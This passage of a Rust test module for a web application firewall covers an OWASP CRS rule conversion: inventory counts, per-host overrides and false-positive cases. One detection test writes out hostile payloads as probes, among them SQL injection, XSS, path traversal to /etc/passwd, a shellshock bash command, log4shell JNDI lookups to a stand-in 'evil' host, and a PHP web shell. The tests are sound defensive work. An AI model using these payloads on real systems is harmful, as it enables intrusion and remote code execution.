        assert_eq!(checker.load_summary().count(RejectCategory::DataFile), 1);

        std::fs::remove_dir_all(&dir).ok();
    }

    // ── Shipped rule-set inventory ───────────────────────────────────────────

    /// Reconciliation baseline for the shipped CRS conversion.
    ///
    /// These numbers are the accounting basis for external conformance runs.
    /// If `rules/owasp-crs/` is re-synced from upstream this test is expected
    /// to fail — update it deliberately and re-publish the coverage figures.
    #[test]
    fn shipped_crs_inventory_is_fully_accounted_for() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let summary = checker.load_summary();

        assert!(summary.source_errors.is_empty(), "shipped rule set must parse cleanly");
        // 286 before the multipart parser: CRS-920120 and CRS-920121 are
        // declared now that `FILES` / `FILES_NAMES` exist to carry them. 288
        // before `header:<name>`: six 920 rules that read one request header by
        // name are declared now that there is a field for them — 920210,
        // 920275, 920310, 920520, 920521, 920600.
        assert_eq!(summary.attempted, 294, "declared CRS rules");
        // 215 before per-parameter `ARGS`: CRS-942130 joins the set, because
        // its `TX:1 @streq %{TX.2}` capture equality is only a tautology test
        // when the head is evaluated one parameter at a time. 216 before the
        // response phase was wired: the 950–956 rules used to be rejected as
        // `UnsupportedField(response_body)` and now compile. 274 before `!@op`
        // heads were converted at all: CRS-920470 and CRS-954130 join the set.
        // 276 before the `multipart/form-data` parser: the two newly declared
        // 920 rules compile, and so do the seven that were rejected for naming
        // `FILES` / `FILES_NAMES` / `MULTIPART_PART_HEADERS` — 932180, 933110,
        // 933111, 933220, 944140, 922120, 922130. 285 before `header:<name>`:
        // all six newly declared 920 rules compile.
        assert_eq!(summary.compiled, 291, "enforceable CRS rules");
        assert_eq!(checker.rule_count(), summary.compiled);
        assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());

        // The split between the two pipelines, stated so a rule that quietly
        // changes sides is a test failure rather than a coverage surprise.
        assert_eq!(checker.request_rule_count(), 232, "request-phase rules");
        assert_eq!(checker.response_rule_count(), 59, "response-phase rules");
        assert_eq!(
            checker.request_rule_count() + checker.response_rule_count(),
            checker.rule_count()
        );

        // Nothing is enforced in a form the upstream rule would not recognise.
        // Every rejection names the `ModSecurity` construct this engine cannot
        // evaluate, so the startup WARN doubles as the "not supported yet"
        // inventory.  Re-syncing CRS is expected to move these numbers.
        let by_field = |name: &str| {
            summary
                .rejected
                .iter()
                .filter(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == name))
                .count()
        };
        // The CRS 95x block is response-phase in its entirety and is now
        // evaluated rather than rejected, so nothing is left in this bucket.
        assert_eq!(by_field("response_body"), 0, "RESPONSE_BODY is evaluated");
        assert_eq!(by_field("response_status"), 0, "RESPONSE_STATUS is evaluated");
        // `FILES` / `FILES_NAMES` and `MULTIPART_PART_HEADERS` used to be the
        // two largest sentinels here (5 rules and 2 rules). Both are now real
        // surfaces fed by the `multipart/form-data` parser, so nothing is left
        // in either bucket. `REQUEST_HEADERS:X-Filename` and friends used to be
        // dropped from those same rules — narrowing them rather than losing
        // them — and are now read by name through `Field::Named`.
        assert_eq!(by_field("unmapped_files"), 0, "FILES is parsed");
        assert_eq!(by_field("unmapped_files_names"), 0, "FILES_NAMES is parsed");
        assert_eq!(
            by_field("unmapped_multipart_part_headers"),
            0,
            "MULTIPART_PART_HEADERS is parsed"
        );
        // `&REQUEST_HEADERS:Range` is a *count*, not a value.
        assert_eq!(by_field("unmapped_count_request_headers_range"), 1, "CRS-921230");
        // CRS-931130's chained condition reads `TX:/rfi_parameter_.*/`, a
        // collection an earlier `setvar` in the same rule built.  The converter
        // models no variable store, so the rule is refused whole: its first
        // condition alone is "block any argument containing `scheme://`".
        assert_eq!(by_field("unmapped_chained_tx_variable"), 1, "CRS-931130");
        // CRS-942130's chained `TX:1 @streq %{TX.2}` asserts that two captures
        // of one *parameter* are the same word.  It used to be refused: without
        // an ARGS splitter the rule saw the whole query string, where the
        // `name=value` separator forms that equality by itself and `?tab=tab`
        // reads as a `1=1` tautology.  Per-parameter `ARGS` makes it mean what
        // upstream means, so it is enforced and the sentinel is gone.
        assert_eq!(by_field("unmapped_chained_args_self_equality"), 0, "CRS-942130");
        // 112 before per-parameter `ARGS` (CRS-942130 left the list), 111
        // before the response phase was wired (the 950–956 rules left it), 9
        // before the `multipart/form-data` parser (the seven `FILES` /
        // `MULTIPART_PART_HEADERS` rules left it).
        assert_eq!(summary.rejected_field_count(), 2, "rules the engine cannot evaluate");
        assert!(
            summary
                .rejected
                .iter()
                .filter(|r| r.reason.category() == RejectCategory::UnsupportedField)
                .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f)
                    if f.starts_with("unmapped_"))),
            "an unsupported field must be an unmapped-variable marker"
        );
        assert_eq!(
            summary.rejected_operator_count(),
            0,
            "all CRS operators are implemented"
        );
        // Every `t:` the shipped conversion declares is implemented.  CRS
        // v4.25.0's request-phase files use 17 distinct transformations —
        // `urlDecodeUni`, `jsDecode`, `lowercase`, `htmlEntityDecode`,
        // `utf8toUnicode`, `removeNulls`, `cssDecode`, `cmdLine`,
        // `removeWhitespace`, `replaceComments`, `normalizePath`,
        // `escapeSeqDecode`, `compressWhitespace`, `normalizePathWin`,
        // `base64Decode`, `length`, `removeCommentsChar` — and a rule naming
        // one this engine lacks is dropped, not approximated.
        assert_eq!(
            summary.count(RejectCategory::UnsupportedTransformation),
            0,
            "every declared transformation must be implemented"
        );
        // CRS-921250 applies `@streq` to `REQUEST_COOKIES`, a collection.
        assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
        assert_eq!(summary.count(RejectCategory::InvalidValue), 0);
        assert_eq!(summary.count(RejectCategory::DataFile), 0, "every wordlist must load");
        // A chained rule the converter could not express is refused by its
        // `field`, before the chain is even looked at; this category only fires
        // for a hand-written rule file.
        assert_eq!(summary.count(RejectCategory::Chain), 0);

        // Every `ModSecurity` `chain` in the shipped set is enforced with all
        // of its conditions, or not at all.  Enforcing only the first condition
        // is what made CRS-944110 block any request mentioning "runtime".
        let chained: Vec<&str> = checker
            .rules
            .iter()
            .filter(|r| !r.chain.is_empty())
            .map(|r| r.id.as_str())
            .collect();
        assert_eq!(
            chained,
            [
                "CRS-944110",
                "CRS-944120",
                "CRS-933150",
                "CRS-920200",
                // Joins the set with the by-name header accessor: its head is
                // `REQUEST_HEADERS:Accept "@rx ^$"`, and both links (`!^OPTIONS$`
                // on the method, `!@pm` on the User-Agent) were already
                // expressible.
                "CRS-920310",
                // Joins the set with the `multipart/form-data` parser: its head
                // is `FILES @pmFromFile restricted-upload.data`, which had no
                // field to read before.
                "CRS-932180",
                "CRS-932200",
                "CRS-932205",
                "CRS-932206",
                "CRS-932207",
                "CRS-932240",
                "CRS-943110",
                "CRS-943120",
                "CRS-942130",
                "CRS-942131",
                "CRS-942440",
                "CRS-942521",
                "CRS-941310",
            ],
            "chained rules enforced in full"
        );

        // `all` walks every request header value, so it is reserved for the
        // rules whose upstream variable list really is the whole request.  The
        // rest name the surfaces they read.  If a re-sync pushes this back up,
        // the converter's surface mapping has regressed.
        let catch_all = checker
            .rules
            .iter()
            .filter(|r| r.head.field == CondField::Request(Field::Multi(Surfaces::ALL)))
            .count();
        // Was 6 before `REQUEST_URI_RAW` / `REQUEST_LINE` got their own field
        // (CRS-944130 / CRS-944150 / CRS-944151 name `REQUEST_LINE`, which used
        // to fold into `path`), then 3, and now none at all: `all` is the union
        // of *whole* surfaces, and a variable list reaching `ARGS` no longer
        // contributes the whole query string to it.  Those three rules now name
        // `path+args+args_names+body+cookies+cookies_names+headers`, which is
        // strictly more precise — the entire request minus the cross-parameter
        // matching.
        assert_eq!(catch_all, 0, "rules scanning the entire request");

        // No response-phase rule may end up in the *request* pipeline: its
        // patterns describe server output, and matching them against a request
        // is a pure false positive. They live in `response_rules` instead.
        let leaked: Vec<&str> = checker
            .rules
            .iter()
            .filter(|r| r.reads_response())
            .map(|r| r.id.as_str())
            .collect();
        assert!(
            leaked.is_empty(),
            "response-phase rules must not be in the request pipeline: {leaked:?}"
        );
    }

    /// A request built from parts, for probing the shipped rule set the way a
    /// real client would exercise it.
    fn probe(method: &str, path: &str, query: &str, headers: &[(&str, &str)], body: &str, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx(method, path, body.len() as u64);
        ctx.query = query.into();
        ctx.body_preview = Bytes::copy_from_slice(body.as_bytes());
        for (name, value) in headers {
            ctx.headers.insert((*name).into(), (*value).into());
        }
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

    /// A one-rule set that matches every request, with the action left open so
    /// a test can compile the same rule as `log` and as `block`.
    const PROBE_RULE: &str = r#"
version: "1.0"
rules:
  - id: PROBE-001
    name: Matches every request path
    category: probe
    severity: critical
    paranoia: 1
    field: path
    operator: contains
    value: "/"
    action: ACTION
"#;

    /// A check with a live audit log attached, plus the drain side, so a test
    /// can read exactly what the check recorded.
    fn audited(yaml: &str) -> (OWASPCheck, crate::audit_log::AuditLogWorker) {
        let sink = Arc::new(AuditLogSink::new(&waf_common::AuditLogConfig {
            enabled: true,
            ..waf_common::AuditLogConfig::default()
        }));
        let worker = sink.take_worker().expect("worker taken once");
        let check = OWASPCheck::from_yaml(yaml)
            .with_config(&OwaspConfig::default())
            .with_audit_log(Some(sink));
        (check, worker)
    }

    /// One override row, already resolved.
    fn override_spec(rule_id: &str, host_code: Option<&str>, state: RuleState) -> RuleOverrideSpec {
        RuleOverrideSpec {
            rule_id: rule_id.to_owned(),
            host_code: host_code.map(str::to_owned),
            state,
        }
    }

    /// `probe`, but for a named host, so per-host override scoping can be tested.
    fn probe_for_host(host_code: &str) -> RequestCtx {
        let mut ctx = probe("GET", "/anything", "", &[], "", 1);
        let mut cfg = HostConfig::clone(&ctx.host_config);
        cfg.code = host_code.to_owned();
        ctx.host_config = Arc::new(cfg);
        ctx
    }

    // ── Operator overrides ────────────────────────────────────────────────────

    #[test]
    fn disabling_a_rule_stops_it_blocking_and_restoring_it_brings_it_back() {
        let checker =
            OWASPCheck::from_yaml(&PROBE_RULE.replace("ACTION", "block")).with_config(&OwaspConfig::default());
        let ctx = probe("GET", "/anything", "", &[], "", 1);
        assert!(checker.check(&ctx).is_some(), "the rule blocks before any override");

        let report = checker.load_overrides(&[override_spec("PROBE-001", None, RuleState::Disabled)]);
        assert_eq!(report.applied, 1);
        assert_eq!(report.disabled, 1);
        assert!(report.unknown_rule_ids.is_empty());
        assert!(
            checker.check(&ctx).is_none(),
            "a disabled rule must not be evaluated, let alone block"
        );

        // Removing the row restores the declared behaviour with no reload of
        // the rule set itself.
        checker.load_overrides(&[]);
        assert!(checker.check(&ctx).is_some(), "clearing the override restores the rule");
        assert_eq!(checker.override_counts(), (0, 0));
    }

    #[test]
    fn a_log_only_override_records_the_match_and_stops_it_scoring() {
        let (checker, mut worker) = audited(&PROBE_RULE.replace("ACTION", "block"));
        let ctx = probe("GET", "/anything", "", &[], "", 1);
        assert!(checker.check(&ctx).is_some());
        let blocked = worker.drain_to_string();
        assert!(blocked.contains("[id \"949110\"]"), "baseline is a block: {blocked}");

        checker.load_overrides(&[override_spec("PROBE-001", None, RuleState::LogOnly)]);
        assert_eq!(checker.override_counts(), (0, 1));
        assert!(
            checker.check(&ctx).is_none(),
            "a log-only rule contributes no score, so the threshold is never reached"
        );
        let recorded = worker.drain_to_string();
        assert!(
            recorded.contains("[ref \"PROBE-001\"]") && recorded.contains("[score \"0\"]"),
            "the downgraded rule must still be recorded — otherwise 'observe first' observes \
             nothing: {recorded}"
        );
        assert!(
            !recorded.contains("[id \"949110\"]"),
            "nothing was blocked, so no blocking-evaluation line: {recorded}"
        );
    }

    #[test]
    fn a_disabled_rule_is_not_even_recorded() {
        let (checker, mut worker) = audited(&PROBE_RULE.replace("ACTION", "block"));
        checker.load_overrides(&[override_spec("PROBE-001", None, RuleState::Disabled)]);
        assert!(checker.check(&probe("GET", "/anything", "", &[], "", 1)).is_none());
        assert!(
            worker.drain_to_string().is_empty(),
            "`disabled` means the rule is not evaluated at all — that is what makes it a hole and \
             `log_only` the tuning tool"
        );
    }

    #[test]
    fn a_host_scoped_override_layers_on_top_of_the_global_one() {
        let checker =
            OWASPCheck::from_yaml(&PROBE_RULE.replace("ACTION", "block")).with_config(&OwaspConfig::default());
        checker.load_overrides(&[
            override_spec("PROBE-001", None, RuleState::Disabled),
            override_spec("PROBE-001", Some("noisy-app"), RuleState::Active),
        ]);
        assert!(
            checker.check(&probe_for_host("some-other-host")).is_none(),
            "the global row governs every host without rows of its own"
        );
        assert!(
            checker.check(&probe_for_host("noisy-app")).is_some(),
            "a host row must be able to cancel the global one, or per-host scoping is decorative"
        );
    }

    #[test]
    fn a_host_scoped_disable_leaves_every_other_host_enforcing() {
        let checker =
            OWASPCheck::from_yaml(&PROBE_RULE.replace("ACTION", "block")).with_config(&OwaspConfig::default());
        let report = checker.load_overrides(&[override_spec("PROBE-001", Some("noisy-app"), RuleState::Disabled)]);
        assert_eq!(report.hosts, 1);
        assert_eq!(
            checker.override_counts(),
            (0, 0),
            "the global layer is untouched by a host-scoped row"
        );
        assert!(checker.check(&probe_for_host("noisy-app")).is_none());
        assert!(checker.check(&probe_for_host("everyone-else")).is_some());
    }

    #[test]
    fn both_spellings_of_a_rule_id_resolve() {
        const RULE: &str = r#"
version: "1.0"
rules:
  - id: CRS-942100
    name: Probe
    crs_id: 942100
    category: sqli
    severity: critical
    paranoia: 1
    field: path
    operator: contains
    value: "/"
    action: block
"#;
        let checker = OWASPCheck::from_yaml(RULE).with_config(&OwaspConfig::default());
        assert!(checker.knows_rule("CRS-942100"));
        assert!(checker.knows_rule("942100"), "the bare upstream number must resolve");
        assert!(!checker.knows_rule("942101"));

        let ctx = probe("GET", "/anything", "", &[], "", 1);
        checker.load_overrides(&[override_spec("942100", None, RuleState::Disabled)]);
        assert!(
            checker.check(&ctx).is_none(),
            "disabling by the upstream number must take effect, not silently miss"
        );
    }

    #[test]
    fn an_override_for_an_unknown_rule_is_reported_not_swallowed() {
        let checker =
            OWASPCheck::from_yaml(&PROBE_RULE.replace("ACTION", "block")).with_config(&OwaspConfig::default());
        let report = checker.load_overrides(&[
            override_spec("PROBE-001", None, RuleState::Disabled),
            override_spec("CRS-000000", None, RuleState::Disabled),
        ]);
        assert_eq!(report.applied, 1);
        assert_eq!(report.unknown_rule_ids, vec!["CRS-000000".to_owned()]);
    }

    #[test]
    fn a_response_rule_can_be_disabled_independently_of_the_request_ones() {
        const RULES: &str = r#"
version: "1.0"
rules:
  - id: REQ-001
    name: Request probe
    category: probe
    severity: critical
    paranoia: 1
    field: path
    operator: contains
    value: "/"
    action: block
  - id: RESP-001
    name: Response probe
    category: probe
    severity: critical
    paranoia: 1
    field: response_body
    operator: contains
    value: "secret"
    action: block
"#;
        let checker = OWASPCheck::from_yaml(RULES).with_config(&OwaspConfig::default());
        assert_eq!(checker.request_rule_count(), 1);
        assert_eq!(checker.response_rule_count(), 1);

        checker.load_overrides(&[override_spec("RESP-001", None, RuleState::Disabled)]);
        let registry = checker.registry(None);
        let by_id = |id: &str| {
            registry
                .iter()
                .find(|r| r.id == id)
                .map(|r| r.state)
                .expect("rule is listed")
        };
        assert_eq!(by_id("REQ-001"), RuleState::Active, "the request rule is untouched");
        assert_eq!(by_id("RESP-001"), RuleState::Disabled);
        assert!(
            checker.check(&probe("GET", "/anything", "", &[], "", 1)).is_some(),
            "disabling a response rule must not disturb the request phase"
        );
    }

    #[test]
    fn the_registry_describes_every_enforced_rule() {
        let checker = OWASPCheck::from_directory(&crs_dir()).with_config(&OwaspConfig::default());
        let registry = checker.registry(None);
        assert_eq!(
            registry.len(),
            checker.rule_count(),
            "the registry is the enforced set, no more and no less"
        );
        let sqli = registry
            .iter()
            .find(|r| r.id == "CRS-942100")
            .expect("the shipped set contains CRS-942100");
        assert_eq!(sqli.crs_id, Some(942_100));
        assert_eq!(sqli.category, "sqli");
        assert_eq!(sqli.declared_action, "score");
        assert_eq!(sqli.severity, "critical");
        assert_eq!(sqli.state, RuleState::Active);
        assert_eq!(sqli.phase, "request");
        assert!(
            sqli.source.ends_with("sqli.yaml"),
            "the registry names the file a rule came from: {}",
            sqli.source
        );
        assert!(
            registry.iter().all(|r| !r.id.is_empty() && !r.name.is_empty()),
            "every listed rule is identifiable"
        );
    }

    #[test]
    fn an_override_row_is_resolved_the_same_way_wherever_it_is_read() {
        assert_eq!(RuleState::from_row(Some(false), None), Ok(RuleState::Disabled));
        assert_eq!(RuleState::from_row(Some(true), None), Ok(RuleState::Active));
        assert_eq!(RuleState::from_row(None, Some("log")), Ok(RuleState::LogOnly));
        assert_eq!(RuleState::from_row(Some(true), Some("log")), Ok(RuleState::LogOnly));
        assert_eq!(RuleState::from_row(None, Some("block")), Ok(RuleState::Active));
        assert_eq!(RuleState::from_row(None, Some("SCORE")), Ok(RuleState::Active));
        assert_eq!(
            RuleState::from_row(None, None),
            Err(RuleOverrideError::Empty),
            "a row that changes nothing is a mistake, not a no-op to be stored"
        );
        assert_eq!(
            RuleState::from_row(Some(false), Some("log")),
            Err(RuleOverrideError::Contradictory)
        );
        assert_eq!(
            RuleState::from_row(None, Some("deny")),
            Err(RuleOverrideError::UnsupportedAction("deny".to_owned())),
            "escalating a rule to an unconditional deny is not implemented and must not be stored"
        );
    }

    #[test]
    fn overrides_do_not_change_the_shipped_verdicts_when_none_are_configured() {
        // The guarantee the go-ftw ratchet depends on: the override layer is
        // inert until an operator uses it.
        let checker = OWASPCheck::from_directory(&crs_dir()).with_config(&OwaspConfig::default());
        let sqli = probe("GET", "/", "id=1'+or+'1'='1", &[], "", 1);
        let before = checker.check(&sqli).map(|d| d.rule_id);
        checker.load_overrides(&[]);
        assert_eq!(checker.check(&sqli).map(|d| d.rule_id), before);
        assert_eq!(checker.override_counts(), (0, 0));
    }

    /// The headers an ordinary browser sends.
    fn browser_headers() -> Vec<(&'static str, &'static str)> {
        vec![
            (
                "user-agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
            ),
            (
                "accept",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            ),
            ("accept-encoding", "gzip, deflate, br, zstd"),
            ("accept-language", "en-GB,en;q=0.9"),
            ("referer", "https://shop.example.com/products?page=2&sort=price"),
            ("cookie", "session=8f3ab21c9de4; locale=en_GB; cart_items=3"),
        ]
    }

    const MULTIPART_UPLOAD: &str = "------WebKitFormBoundaryABC\r\n\
Content-Disposition: form-data; name=\"file\"; filename=\"quarterly-report.pdf\"\r\n\
Content-Type: application/pdf\r\n\r\n\
%PDF-1.4 quarterly figures\r\n\
------WebKitFormBoundaryABC--\r\n";

    /// Ordinary traffic that the shipped CRS conversion used to block.
    ///
    /// Every entry here was verified to be blocked before the variable mapping
    /// was corrected, and the rule that blocked it is named.  The common cause
    /// was a `ModSecurity` variable the converter did not recognise, or a
    /// narrow one it widened: the rule then ran against request surfaces its
    /// pattern was never written for.
    #[test]
    fn crs_conversion_does_not_block_ordinary_traffic() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let browser = browser_headers();
        let form = [
            ("content-type", "application/x-www-form-urlencoded"),
            ("cookie", "session=8f3ab21c9de4"),
        ];

        let cases: Vec<(&str, RequestCtx)> = vec![
            // CRS-933150 matches the PHP function name `urlencode`, and
            // `application/x-www-form-urlencoded` contains it: with the rule on
            // a field that walks header values, every HTML form POST was
            // blocked at the default paranoia level.
            (
                "urlencoded form POST",
                probe(
                    "POST",
                    "/account/settings",
                    "",
                    &form,
                    "display_name=Jo+Smith&api_key=k_live_9f2&timezone=Europe%2FLondon",
                    1,
                ),
            ),
            // CRS-941130 matches `xhtml`, which every browser sends in `Accept`.
            (
                "plain browser page view",
                probe("GET", "/products/laptop-pro-14", "page=2&sort=price", &browser, "", 1),
            ),
            // CRS-933110 / CRS-944140 test *uploaded file names* for a script
            // extension.  Run over the whole request they matched the URL path.
            (
                "GET a .php URL",
                probe("GET", "/wp-admin/admin-ajax.php", "action=heartbeat", &browser, "", 1),
            ),
            (
                "GET a .phtml URL",
                probe("GET", "/app/legacy.phtml", "", &browser, "", 1),
            ),
            (
                "GET a .jsp URL",
                probe("GET", "/portal/dashboard.jsp", "tab=1", &browser, "", 1),
            ),
            (
                "Referer pointing at a .php page",
                probe("GET", "/", "", &[("referer", "https://shop.example/cart.php")], "", 1),
            ),
            // CRS-922130 reads `MULTIPART_PART_HEADERS`; over the whole request
            // its pattern reduces to "whitespace, a word, a colon".
            (
                "shebang + YAML request body",
                probe("POST", "/api/save", "", &[], "#!/opt/app/runner\nname: demo", 1),
            ),
            (
                "Ruby error text in a log payload",
                probe(
                    "POST",
                    "/api/log",
                    "",
                    &[],
                    "log=undefined method `foo' for nil:NilClass",
                    1,
                ),
            ),
            (
                "legitimate multipart file upload",
                probe(
                    "POST",
                    "/upload",
                    "",
                    &[(
                        "content-type",
                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
                    )],
                    MULTIPART_UPLOAD,
                    1,
                ),
            ),
            // CRS-932180 tests uploaded file names against restricted-upload.data,
            // which lists `.env`; the raw body is not a file name.
            (
                "documentation mentioning .env keys",
                probe(
                    "POST",
                    "/api/docs",
                    "",
                    &[("content-type", "text/plain")],
                    "Set APP_KEY= and DB_PASSWORD= in your .env before booting",
                    1,
                ),
            ),
            (
                "JSON API request",
                probe(
                    "POST",
                    "/api/v2/orders",
                    "",
                    &[
                        ("content-type", "application/json"),
                        ("authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.e30.sig"),
                    ],
                    "{\"items\":[{\"sku\":\"AB-12\",\"qty\":2}],\"note\":\"leave at door\"}",
                    1,
                ),
            ),
            // CRS-921230 counts `Range` headers; as a value test it never fired,
            // but the count is not expressible either way.
            (
                "byte-range media request",
                probe("GET", "/media/clip.mp4", "", &[("range", "bytes=1024-2047")], "", 3),
            ),
            // CRS-942130 without its chained `TX:1 @streq %{TX.2}` reduces to
            // "block any `word = word`".
            (
                "template placeholder in a body",
                probe("POST", "/api/render", "", &[], "tpl=hello #{name}", 2),
            ),
            (
                "ordinary key/value query string",
                probe("GET", "/search", "sort=price&view=grid", &[], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            assert!(
                checker.check(ctx).is_none(),
                "{label} must not be blocked, got {:?}",
                checker.check(ctx).and_then(|d| d.rule_id)
            );
        }
    }

    /// The narrowed fields must not cost detection: each payload is placed on a
    /// surface the upstream CRS rule genuinely reads.
    ///
    /// Every body probe therefore declares the `Content-Type` its payload is
    /// actually shaped like. That is not a formality: upstream picks the body
    /// processor — and with it which variables the body populates at all —
    /// from that header alone ([`body_processors`]), so a `name=value` body
    /// sent without it reaches neither `ARGS_POST` upstream nor here.
    #[test]
    fn crs_conversion_still_detects_attacks_on_every_surface() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            (
                "sqli in query string",
                probe("GET", "/list", "id=1' OR '1'='1", &[], "", 1),
            ),
            (
                "sqli in urlencoded POST body",
                probe(
                    "POST",
                    "/login",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "user=admin%27+OR+1%3D1--+&pw=x",
                    1,
                ),
            ),
            (
                "sqli union in a JSON body",
                probe(
                    "POST",
                    "/api/q",
                    "",
                    &[("content-type", "application/json")],
                    "{\"q\":\"1 UNION SELECT password FROM users\"}",
                    1,
                ),
            ),
            (
                "xss in query string",
                probe("GET", "/s", "q=<script>alert(1)</script>", &[], "", 1),
            ),
            (
                "xss in a POST body",
                probe(
                    "POST",
                    "/comment",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                    1,
                ),
            ),
            (
                "xss in a cookie value",
                probe("GET", "/", "", &[("cookie", "theme=<script>alert(1)</script>")], "", 1),
            ),
            (
                "path traversal in query",
                probe("GET", "/download", "f=../../../../etc/passwd", &[], "", 1),
            ),
            (
                "path traversal in body",
                probe(
                    "POST",
                    "/render",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "tpl=../../../../etc/passwd",
                    1,
                ),
            ),
            (
                "shellshock in User-Agent",
                probe(
                    "GET",
                    "/cgi-bin/x",
                    "",
                    &[("user-agent", "() { :;}; /bin/bash -c 'id'")],
                    "",
                    1,
                ),
            ),
            (
                "log4shell in a header",
                probe("GET", "/", "", &[("x-api-version", "${jndi:ldap://evil/a}")], "", 1),
            ),
            (
                "log4shell in a cookie",
                probe("GET", "/", "", &[("cookie", "sid=${jndi:ldap://evil/a}")], "", 1),
            ),
            (
                "rce in a POST body",
                probe(
                    "POST",
                    "/run",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "cmd=;/bin/cat /etc/passwd",
                    1,
                ),
            ),
            (
                "php web shell uploaded through multipart",
                probe(
                    "POST",
                    "/upload",
                    "",
                    &[(
                        "content-type",
                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
                    )],
                    "------WebKitFormBoundaryABC\r\n\
Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n\
<?php system($_GET['c']); ?>\r\n\
------WebKitFormBoundaryABC--\r\n",
                    1,
                ),
            ),
            (
                "scanner user-agent",
                probe("GET", "/", "", &[("user-agent", "Nikto/2.1.6")], "", 1),
            ),
            (
                "unix shell payload in Referer",
                probe("GET", "/", "", &[("referer", "http://x/?a=;cat /etc/passwd")], "", 2),
            ),
            (
                "os file name in Referer",
                probe("GET", "/", "", &[("referer", "/etc/shadow")], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            let hit = checker.check(ctx);
            assert!(hit.is_some(), "{label} must still be detected");
        }
    }

    /// The `rules/` tree holds seven rule directories and the engine loads
    /// exactly one of them ([`DEFAULT_RULES_DIR`]).  The other six are not
    /// dead weight by accident — they were audited rule by rule and left off
    /// for cause (`rules/README.md`, "Audit: why the other directories are
    /// off").
    ///
    /// This pins what each directory *would* contribute if someone pointed the
    /// loader at it, so the audit's arithmetic stays checkable and so a rule
    /// added to one of them cannot arrive unnoticed.  `declared` is what the
    /// YAML says; `compiled` is what survives
    /// [`Loader::compile`].  Where they differ, the gap is a rule this engine
    /// cannot evaluate — usually a PCRE-only regex, which `regex` rejects.
    #[test]
    fn rule_directory_load_status_is_pinned() {
        // (directory, declared, compiled)
        let expected = [
            ("owasp-crs", 294, 291),
            ("advanced", 77, 75),
            ("owasp-api", 64, 61),
            ("modsecurity", 46, 40),
            ("cve-patches", 39, 39),
            ("bot-detection", 42, 42),
            ("custom", 7, 7),
        ];

        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules");
        for (name, declared, compiled) in expected {
            let checker = OWASPCheck::from_directory(&root.join(name));
            let summary = checker.load_summary();
            assert!(
                summary.source_errors.is_empty(),
                "rules/{name}/: unreadable source(s): {:?}",
                summary.source_errors
            );
            assert_eq!(summary.attempted, declared, "rules/{name}/: declared rule count");
            assert_eq!(summary.compiled, compiled, "rules/{name}/: compiled rule count");
        }

        // `rules/geoip/` held two rules naming `geo_iso` / `geo_isp`, which are
        // not fields this engine has (`Field::parse`), against an operator it
        // does not implement (`in`), for a phase that cannot reach `ctx.geo` at
        // all.  Zero of them could ever compile, so the file was removed rather
        // than left looking like configuration; country blocking goes through
        // the custom-rules engine.  Assert the directory holds no rule file, so
        // a future one has to justify itself.
        let geoip = root.join("geoip");
        assert!(geoip.is_dir(), "rules/geoip/ keeps its README");
        let yaml_files: Vec<_> = std::fs::read_dir(&geoip)
            .expect("read rules/geoip/")
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().and_then(OsStr::to_str) == Some("yaml"))
            .collect();
        assert!(
            yaml_files.is_empty(),
            "rules/geoip/ cannot hold enforceable rules — the OWASP phase has no geographic field: {yaml_files:?}"
        );
    }

    /// The single measurement that decides `rules/advanced/`.
    ///
    /// `ADV-SSRF-001`..`004` are `field: all`, `severity: critical`,
    /// `paranoia: 1`, `action: block` — and `all` covers every request *header
    /// value* ([`Surfaces::ALL`]).  A private address anywhere in
    /// `X-Forwarded-For` therefore reaches the inbound threshold on its own.
    /// That header is not an attack signal; it is what every load balancer and
    /// every ingress controller in front of this proxy appends, which makes
    /// enabling the directory a site-wide outage rather than a tuning problem.
    ///
    /// Kept as a test rather than a paragraph because the paragraph in
    /// `rules/advanced/README.md` is only worth reading if it is still true.
    #[test]
    fn advanced_rules_block_ordinary_internal_load_balancer_traffic() {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/advanced");
        let checker = OWASPCheck::from_directory(&dir).with_config(&OwaspConfig::default());

        for forwarded in ["203.0.113.9, 10.0.1.7", "198.51.100.4, 192.168.1.20", "127.0.0.1"] {
            let ctx = probe("GET", "/", "", &[("x-forwarded-for", forwarded)], "", 1);
            let hit = checker.check(&ctx);
            assert!(
                hit.is_some(),
                "rules/advanced/ no longer blocks `X-Forwarded-For: {forwarded}` — if the SSRF \
                 rules were narrowed off the header surface, re-run the audit in rules/README.md \
                 and update the verdict before enabling the directory"
            );
        }

        // The same request without the proxy header is fine, so the header is
        // the whole cause.
        let clean = probe("GET", "/", "", &[], "", 1);
        assert!(checker.check(&clean).is_none(), "the bare request is not the problem");
    }

    /// `action: log` blocks nothing *and is written to the audit log*.
    ///
    /// Both halves are load-bearing and they used to disagree: the `Log` arm of
    /// [`Self::evaluate_rules`] produced a `debug!` and no [`Contribution`], and
    /// [`Self::record_audit`] builds the audit rows from the contributions, so a
    /// matching `log` rule left no audit-log row, no `security_events` row and —
